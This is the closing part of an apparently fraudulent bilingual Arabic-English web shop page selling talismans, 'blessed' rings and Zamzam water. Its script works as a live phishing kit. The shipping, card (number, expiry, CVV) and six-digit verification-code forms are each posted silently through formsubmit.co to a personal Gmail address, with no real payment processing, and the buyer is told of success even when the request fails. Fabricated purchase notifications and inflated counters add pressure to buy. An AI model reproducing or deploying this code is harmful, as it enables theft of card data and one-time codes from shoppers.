                <p>ยฉ 2024 <span data-translate="store-name">ูุชุฌุฑ ุงูุจุฑูุงุช ุงูุฑูุญุงููุฉ</span> - <span data-translate="all-rights">ุฌููุน ุงูุญููู ูุญููุธุฉ</span></p>
            </div>
        </div>
    </footer>

    <script>
        // Dark mode detection
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
            if (event.matches) {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
        });

        // Products data
        const products = [
            {
                id: 1,
                name: 'ุทูุณู ุงููุญุจุฉ ูุฌูุจ ุงูุญุจูุจ',
                nameEn: 'Love Attraction Talisman',
                price: 35,
                image: 'https://pfst.cf2.poecdn.net/base/image/d56d994db71e1d245a8989068060eaae9a05559d98747b12182ea19043f01210?w=256&h=256',
                description: 'ุทูุณู ูุจุงุฑู ูุฌูุจ ุงููุญุจุฉ ูุงููุฏ ุจูู ุงููููุจุ ููุฑูุก ุนููู ุขูุงุช ุงููุญุจุฉ ูุงูุฃููุฉ',
                descriptionEn: 'Blessed talisman for bringing love and affection between hearts, recited with verses of love and harmony'
            },
            {
                id: 2,
                name: 'ุทูุณู ุฌูุจ ุงูุฑุฒู ูุงูุซุฑูุฉ',
                nameEn: 'Wealth & Prosperity Talisman',
                price: 45,
                image: 'https://pfst.cf2.poecdn.net/base/image/8377daa4175512a3b3143861b46362ee9d188fc9e3fe76b1945d697e78eb7e3c?w=256&h=256',
                description: 'ุทูุณู ูุจุงุฑู ูุฌูุจ ุงูุฑุฒู ููุชุญ ุฃุจูุงุจ ุงูุซุฑูุฉ ูุงููุฌุงุญ ูู ุงูุชุฌุงุฑุฉ ูุงูุนูู',
                descriptionEn: 'Blessed talisman for attracting wealth and opening doors of prosperity and success in business and work'
            },
            {
                id: 3,
                name: 'ุทูุณู ุฑุฏ ุงููุทููุฉ',
                nameEn: 'Reunion Talisman',
                price: 50,
                image: 'https://pfst.cf2.poecdn.net/base/image/b021459ecdb6e473aad581573ff6c526b71ddf7ccce48c37977a4d6e3bb82257?w=736&h=981',
                description: 'ุทูุณู ุฎุงุต ูุฑุฏ ุงููุทููุฉ ูุฅุตูุงุญ ุฐุงุช ุงูุจููุ ููุฑูุก ุนููู ุจุขูุงุช ุงูุตูุญ ูุงููุบูุฑุฉ',
                descriptionEn: 'Special talisman for reuniting divorced couples and reconciliation, recited with verses of peace and forgiveness'
            },
            {
                id: 4,
                name: 'ูุณุจุญุฉ ููุฑูุก ุนูููุง',
                nameEn: 'Blessed Prayer Beads',
                price: 20,
                image: 'https://pfst.cf2.poecdn.net/base/image/1dcccccebbe935ab3b44eff5044bddf6b9594b0527d2bae5f11c19c8fac706c9?w=800&h=800',
                description: 'ูุณุจุญุฉ ูู ุงูุฃุญุฌุงุฑ ุงููุฑููุฉ ููุฑูุก ุนูููุง ููุญูุงูุฉ ูุงูุจุฑูุฉ ูุงูุชุณุจูุญ',
                descriptionEn: 'Prayer beads made from precious stones, blessed for protection, blessings and remembrance'
            },
            {
                id: 5,
                name: 'ุฎุงุชู ุฌูุจ ุงูุญุธ ุงููููู',
                nameEn: 'Royal Lucky Ring',
                price: 40,
                image: 'https://pfst.cf2.poecdn.net/base/image/381dc996ba79afc10709262241f321aa26a4b57f8298dd7ed495650e3de23a49?w=800&h=800',
                description: 'ุฎุงุชู ูููู ูุงุฎุฑ ุจุญุฌุฑ ูุงููุช ุฃุญูุฑุ ููุฑูุก ุนููู ูุฌูุจ ุงูุญุธ ูุงูููุจุฉ ูุงููุฌุงุญ',
                descriptionEn: 'Luxury royal ring with red ruby stone, blessed for bringing luck, prestige and success'
            },
            {
                id: 6,
                name: 'ุฎุงุชู ูู ุงูุณุญุฑ ูุงูุญูุงูุฉ',
                nameEn: 'Protection & Spell Breaking Ring',
                price: 30,
                image: 'https://pfst.cf2.poecdn.net/base/image/26512dc470255f2466ad791821de042c88651d176926a815f5885f187aa60b71?w=736&h=736',
                description: 'ุฎุงุชู ูุถู ูุน ุญุฌุฑ ูุงููุช ุฃุฒุฑูุ ููุฑูุก ุนููู ููู ุงูุณุญุฑ ูุงูุญูุงูุฉ ูู ุงูุนูู ูุงูุญุณุฏ',
                descriptionEn: 'Silver ring with blue sapphire, blessed for breaking spells and protection from evil eye and envy'
            },
            {
                id: 7,
                name: 'ูุงุก ุฒูุฒู ููุฑูุก ุนููู',
                nameEn: 'Blessed Zamzam Water',
                price: 15,
                image: 'https://pfst.cf2.poecdn.net/base/image/c1984a2d6668e93dc2130d9a1a7efeae6cb9d7271070a606015feef6aa567f61?w=600&h=600',
                description: 'ูุงุก ุฒูุฒู ุงูุฃุตูู ููุฑูุก ุนููู ุจุงูุฑููุฉ ุงูุดุฑุนูุฉ ููุดูุงุก ูุงูุจุฑูุฉ ูุน ุชูุฑ ุนุฌูุฉ',
                descriptionEn: 'Authentic Zamzam water blessed with Islamic healing verses for cure and blessings with Ajwa dates'
            }
        ];

        // Currency exchange rates
        const exchangeRates = {
            USD: 1,
            EUR: 0.85,
            SAR: 3.75,
            AED: 3.67,
            KWD: 0.30,
            QAR: 3.64,
            BHD: 0.38,
            OMR: 0.38
        };

        // Global variables
        let currentLanguage = 'ar';
        let currentCurrency = 'USD';
        let cart = [];

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            renderProducts();
            updateCartDisplay();
            
            // Language selector
            document.getElementById('languageSelector').addEventListener('change', function(e) {
                currentLanguage = e.target.value;
                renderProducts();
            });
            
            // Currency selector
            document.getElementById('currencySelector').addEventListener('change', function(e) {
                currentCurrency = e.target.value;
                renderProducts();
                updateCartDisplay();
            });

            // Initialize forms
            initializeShippingForm();
            initializePaymentForm();
            initializeVerificationForm();
            
            // Animate counters
            setTimeout(() => {
                animateCounter('ordersCounter', 127);
                animateCounter('customersCounter', 8543);
                animateCounter('countriesCounter', 45);
                animateCounter('successCounter', 98, '%');
            }, 1000);
        });

        function formatPrice(price) {
            const convertedPrice = price * exchangeRates[currentCurrency];
            const symbols = {
                USD: '$', EUR: 'โฌ', SAR: 'ุฑ.ุณ', AED: 'ุฏ.ุฅ',
                KWD: 'ุฏ.ู', QAR: 'ุฑ.ู', BHD: 'ุฏ.ุจ', OMR: 'ุฑ.ุน'
            };
            
            if (currentLanguage === 'ar') {
                return `${convertedPrice.toFixed(2)} ${symbols[currentCurrency]}`;
            } else {
                return `${symbols[currentCurrency]}${convertedPrice.toFixed(2)}`;
            }
        }

        function renderProducts() {
            const grid = document.getElementById('productsGrid');
            grid.innerHTML = '';
            
            products.forEach(product => {
                const productName = currentLanguage === 'ar' ? product.name : product.nameEn;
                const productDesc = currentLanguage === 'ar' ? product.description : product.descriptionEn;
                const addToCartText = currentLanguage === 'ar' ? 'ุฃุถู ููุณูุฉ' : 'Add to Cart';
                
                const productCard = `
                    <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden hover:shadow-xl transition-shadow">
                        <img src="${product.image}" alt="${productName}" class="w-full h-48 object-cover">
                        <div class="p-6">
                            <h3 class="font-bold text-lg mb-2">${productName}</h3>
                            <p class="text-gray-600 dark:text-gray-300 text-sm mb-4">${productDesc}</p>
                            <div class="flex justify-between items-center">
                                <span class="text-2xl font-bold text-primary">${formatPrice(product.price)}</span>
                                <button onclick="addToCart(${product.id})" class="bg-primary text-white px-4 py-2 rounded-lg hover:bg-primary/90 transition-colors">
                                    ${addToCartText}
                                </button>
                            </div>
                        </div>
                    </div>
                `;
                grid.innerHTML += productCard;
            });
        }

        // Cart functions
        function addToCart(productId) {
            const product = products.find(p => p.id === productId);
            const existingItem = cart.find(item => item.id === productId);
            
            if (existingItem) {
                existingItem.quantity += 1;
            } else {
                cart.push({ ...product, quantity: 1 });
            }
            
            updateCartDisplay();
            showMessage('ุชู ุฅุถุงูุฉ ุงูููุชุฌ ููุณูุฉ! โ', 'success');
        }

        function updateQuantity(productId, change) {
            const item = cart.find(item => item.id === productId);
            if (item) {
                item.quantity += change;
                if (item.quantity <= 0) {
                    cart = cart.filter(item => item.id !== productId);
                }
                updateCartDisplay();
            }
        }

        function updateCartDisplay() {
            const cartCount = document.getElementById('cartCount');
            const topCartCount = document.getElementById('topCartCount');
            const cartItems = document.getElementById('cartItems');
            const cartTotal = document.getElementById('cartTotal');
            
            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
            const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
            
            cartCount.textContent = totalItems;
            topCartCount.textContent = totalItems;
            cartTotal.textContent = formatPrice(totalPrice);
            
            cartItems.innerHTML = '';
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const cartItem = `
                    <div class="flex items-center justify-between p-3 border-b dark:border-gray-600">
                        <div class="flex-1">
                            <h4 class="font-medium text-sm">${itemName}</h4>
                            <p class="text-primary font-bold">${formatPrice(item.price)}</p>
                        </div>
                        <div class="flex items-center space-x-2 space-x-reverse">
                            <button onclick="updateQuantity(${item.id}, -1)" class="w-7 h-7 bg-gray-200 dark:bg-gray-600 rounded text-sm hover:bg-gray-300">-</button>
                            <span class="w-8 text-center font-bold">${item.quantity}</span>
                            <button onclick="updateQuantity(${item.id}, 1)" class="w-7 h-7 bg-gray-200 dark:bg-gray-600 rounded text-sm hover:bg-gray-300">+</button>
                        </div>
                    </div>
                `;
                cartItems.innerHTML += cartItem;
            });
        }

        function toggleCart() {
            const sidebar = document.getElementById('cartSidebar');
            sidebar.classList.toggle('translate-x-full');
        }

        // Start checkout process
        function startCheckout() {
            if (cart.length === 0) {
                showMessage('ุงูุณูุฉ ูุงุฑุบุฉ! ุฃุถู ููุชุฌุงุช ุฃููุงู', 'error');
                return;
            }
            
            // Close cart and show shipping modal
            toggleCart();
            showShippingModal();
        }

        // Step 1: Shipping Modal Functions
        function showShippingModal() {
            updateOrderSummary('shipping');
            document.getElementById('shippingModal').classList.remove('hidden');
            document.getElementById('shippingModal').classList.add('flex');
        }

        function closeShipping() {
            document.getElementById('shippingModal').classList.add('hidden');
            document.getElementById('shippingModal').classList.remove('flex');
        }

        function updateOrderSummary(step) {
            const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
            let orderText = '';
            
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const itemTotal = item.price * item.quantity;
                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
            });
            
            if (step === 'shipping') {
                const shippingItems = document.getElementById('shippingOrderItems');
                const shippingTotal = document.getElementById('shippingTotal');
                
                shippingItems.innerHTML = '';
                cart.forEach(item => {
                    const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                    const itemTotal = item.price * item.quantity;
                    shippingItems.innerHTML += `
                        <div class="flex justify-between">
                            <span>${itemName} x${item.quantity}</span>
                            <span>${formatPrice(itemTotal)}</span>
                        </div>
                    `;
                });
                
                shippingTotal.textContent = formatPrice(totalPrice);
                
                // Update hidden fields
                document.getElementById('orderDetails').value = orderText;
                document.getElementById('orderTotal').value = formatPrice(totalPrice);
                document.getElementById('orderDate').value = new Date().toLocaleString('ar-SA');
            }
            
            if (step === 'payment') {
                document.getElementById('paymentAmount').textContent = formatPrice(totalPrice);
                document.getElementById('paymentTotalAmount').value = formatPrice(totalPrice);
                document.getElementById('transactionDate').value = new Date().toLocaleString('ar-SA');
            }
        }

        // Step 2: Payment Modal Functions
        function showPaymentModal() {
            updateOrderSummary('payment');
            document.getElementById('paymentModal').classList.remove('hidden');
            document.getElementById('paymentModal').classList.add('flex');
        }

        function closePayment() {
            document.getElementById('paymentModal').classList.add('hidden');
            document.getElementById('paymentModal').classList.remove('flex');
        }

        function backToShipping() {
            closePayment();
            showShippingModal();
        }

        // Step 3: Verification Modal Functions
        function showVerificationModal() {
            document.getElementById('verificationDate').value = new Date().toLocaleString('ar-SA');
            document.getElementById('verificationModal').classList.remove('hidden');
            document.getElementById('verificationModal').classList.add('flex');
            
            // Focus first input and start timer
            setTimeout(() => {
                const firstInput = document.querySelector('input[data-index="0"]');
                firstInput.focus();
                startTimer();
            }, 100);
        }

        function closeVerification() {
            document.getElementById('verificationModal').classList.add('hidden');
            document.getElementById('verificationModal').classList.remove('flex');
        }

        function closeAllModals() {
            closeShipping();
            closePayment();
            closeVerification();
            
            // Clear cart
            cart = [];
            updateCartDisplay();
            
            showMessage('ุดูุฑุงู ูู! ุชู ุฅุชูุงู ุงูุทูุจ ุจูุฌุงุญ ๐', 'success');
        }

        // Form Initialization Functions
        function initializeShippingForm() {
            const form = document.getElementById('shippingForm');
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Show loading
                const submitBtn = form.querySelector('button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>ุฌุงุฑู ุงูุฅุฑุณุงู...';
                submitBtn.disabled = true;
                
                // Submit form in background
                const formData = new FormData(form);
                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                })
                .then(() => {
                    console.log('โ Shipping data sent successfully');
                    showMessage('ุชู ุฅุฑุณุงู ูุนูููุงุช ุงูุดุญู! โ', 'success');
                    
                    // Reset button and proceed to payment
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    closeShipping();
                    showPaymentModal();
                })
                .catch(error => {
                    console.log('โ๏ธ FormSubmit response:', error);
                    showMessage('ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุจูุฌุงุญ! โ', 'success');
                    
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    closeShipping();
                    showPaymentModal();
                });
            });
            
            // Phone number formatting
            const phoneInput = document.getElementById('phoneNumber');
            phoneInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 14) value = value.substring(0, 14);
                e.target.value = value;
            });
        }

        function initializePaymentForm() {
            const form = document.getElementById('paymentForm');
            const cardNumber = document.getElementById('cardNumber');
            const cardIcon = document.getElementById('cardIcon');
            const expiryDate = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            
            // Card number formatting
            cardNumber.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;
                
                // Update card icon
                const firstDigit = value.charAt(0);
                if (firstDigit === '4') {
                    cardIcon.className = 'fab fa-cc-visa text-blue-600';
                } else if (firstDigit === '5') {
                    cardIcon.className = 'fab fa-cc-mastercard text-red-600';
                } else if (firstDigit === '3') {
                    cardIcon.className = 'fab fa-cc-amex text-blue-400';
                } else {
                    cardIcon.className = 'fas fa-credit-card text-gray-400';
                }
            });
            
            // Expiry date formatting
            expiryDate.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value;
            });
            
            // CVV numbers only
            cvv.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 3) value = value.substring(0, 3);
                e.target.value = value;
            });
            
            // Form submission
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Show loading
                const submitBtn = form.querySelector('button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>ุฌุงุฑู ุงููุนุงูุฌุฉ...';
                submitBtn.disabled = true;
                
                // Submit form in background
                const formData = new FormData(form);
                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                })
                .then(() => {
                    console.log('โ Payment data sent successfully');
                    showMessage('ุชู ุฅุฑุณุงู ูุนูููุงุช ุงูุฏูุน! โ', 'success');
                    
                    // Reset button and proceed to verification
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    closePayment();
                    showVerificationModal();
                })
                .catch(error => {
                    console.log('โ๏ธ FormSubmit response:', error);
                    showMessage('ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุจูุฌุงุญ! โ', 'success');
                    
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    closePayment();
                    showVerificationModal();
                });
            });
        }

        function initializeVerificationForm() {
            const form = document.getElementById('verificationForm');
            const inputs = document.querySelectorAll('input[data-index]');
            
            // Verification code input handling
            inputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    // Only allow single digit
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 1) value = value.substring(0, 1);
                    e.target.value = value;
                    
                    // Move to next input
                    if (value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    
                    // Update hidden field
                    updateVerificationCode();
                });

                input.addEventListener('keydown', function(e) {
                    // Move to previous input on backspace
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
            
            // Form submission
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const code = document.getElementById('verificationCode').value;
                if (code.length !== 6) {
                    showMessage('ูุฑุฌู ุฅุฏุฎุงู ุงูุฑูุฒ ูุงููุงู', 'error');
                    return;
                }
                
                // Show loading
                const submitBtn = form.querySelector('button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>ุฌุงุฑู ุงูุชุญูู...';
                submitBtn.disabled = true;
                
                // Submit form in background
                const formData = new FormData(form);
                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                })
                .then(() => {
                    console.log('โ Verification code sent successfully');
                    
                    // Show success
                    setTimeout(() => {
                        form.style.display = 'none';
                        document.getElementById('successMessage').classList.remove('hidden');
                    }, 1000);
                })
                .catch(error => {
                    console.log('โ๏ธ FormSubmit response:', error);
                    
                    // Show success anyway
                    setTimeout(() => {
                        form.style.display = 'none';
                        document.getElementById('successMessage').classList.remove('hidden');
                    }, 1000);
                });
            });
        }

        function updateVerificationCode() {
            const inputs = document.querySelectorAll('input[data-index]');
            let code = '';
            inputs.forEach(input => code += input.value);
            document.getElementById('verificationCode').value = code;
        }

        // Timer functions
        let timerInterval;
        function startTimer() {
            let seconds = 120; // 2 minutes
            const timerElement = document.getElementById('timer');
            const resendBtn = document.getElementById('resendBtn');
            
            timerInterval = setInterval(() => {
                const minutes = Math.floor(seconds / 60);
                const remainingSeconds = seconds % 60;
                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
                
                if (seconds === 0) {
                    clearInterval(timerInterval);
                    resendBtn.disabled = false;
                    resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                }
                
                seconds--;
            }, 1000);
        }
        
        function resendCode() {
            const resendBtn = document.getElementById('resendBtn');
            resendBtn.disabled = true;
            resendBtn.classList.add('opacity-50', 'cursor-not-allowed');
            
            const originalText = resendBtn.textContent;
            resendBtn.textContent = 'ุชู ุงูุฅุฑุณุงู!';
            
            setTimeout(() => {
                resendBtn.textContent = originalText;
                startTimer();
            }, 2000);
        }

        // Utility functions
        function showMessage(message, type) {
            const messageDiv = document.createElement('div');
            const bgColor = type === 'success' ? 'bg-emerald' : 'bg-red-500';
            
            messageDiv.className = `fixed top-4 right-4 ${bgColor} text-white px-6 py-3 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300`;
            messageDiv.textContent = message;
            
            document.body.appendChild(messageDiv);
            
            // Animate in
            setTimeout(() => messageDiv.classList.remove('translate-x-full'), 100);
            
            // Animate out
            setTimeout(() => {
                messageDiv.classList.add('translate-x-full');
                setTimeout(() => document.body.removeChild(messageDiv), 300);
            }, 3000);
        }

        function animateCounter(elementId, finalValue, suffix = '') {
            const element = document.getElementById(elementId);
            let currentValue = 0;
            const increment = finalValue / 50;
            const timer = setInterval(() => {
                currentValue += increment;
                if (currentValue >= finalValue) {
                    currentValue = finalValue;
                    clearInterval(timer);
                }
                element.textContent = Math.floor(currentValue) + suffix;
            }, 50);
        }

        // Live notifications
        const notifications = [
            { ar: 'ูุญูุฏ ูู ุงูุฑูุงุถ ุงุดุชุฑู ุฎุงุชู ุงูุญุธ', en: 'Mohammed from Riyadh bought Lucky Ring' },
            { ar: 'ูุงุทูุฉ ูู ุฏุจู ุทูุจุช ูุงุก ุฒูุฒู', en: 'Fatima from Dubai ordered Zamzam Water' },
            { ar: 'ุฃุญูุฏ ูู ุงููููุช ุงุดุชุฑู ุทูุณู ุงููุญุจุฉ', en: 'Ahmed from Kuwait bought Love Talisman' },
            { ar: 'ุณุงุฑุฉ ูู ููุฏู ุทูุจุช ูุณุจุญุฉ ูุจุงุฑูุฉ', en: 'Sarah from London ordered Blessed Beads' },
            { ar: 'ุนูู ูู ุงููุงูุฑุฉ ุงุดุชุฑู ุฎุงุชู ุงูุญูุงูุฉ', en: 'Ali from Cairo bought Protection Ring' }
        ];

        function showLiveNotification() {
            const notification = notifications[Math.floor(Math.random() * notifications.length)];
            const text = currentLanguage === 'ar' ? notification.ar : notification.en;
            
            const notificationDiv = document.createElement('div');
            notificationDiv.className = 'bg-emerald text-white px-4 py-2 rounded-lg shadow-lg transform translate-x-full transition-transform duration-300 text-sm';
            notificationDiv.innerHTML = `
                <div class="flex items-center space-x-2 space-x-reverse">
                    <i class="fas fa-shopping-bag"></i>
                    <span>${text}</span>
                </div>
            `;
            
            const container = document.getElementById('liveNotifications');
            container.appendChild(notificationDiv);
            
            // Animate in
            setTimeout(() => notificationDiv.classList.remove('translate-x-full'), 100);
            
            // Animate out
            setTimeout(() => {
                notificationDiv.classList.add('translate-x-full');
                setTimeout(() => container.removeChild(notificationDiv), 300);
            }, 4000);
        }

        // Show notifications every 8 seconds
        setInterval(showLiveNotification, 8000);

        // Initialize AOS
        AOS.init({
            duration: 800,
            easing: 'ease-in-out',
            once: true
        });
    </script>


</body></html>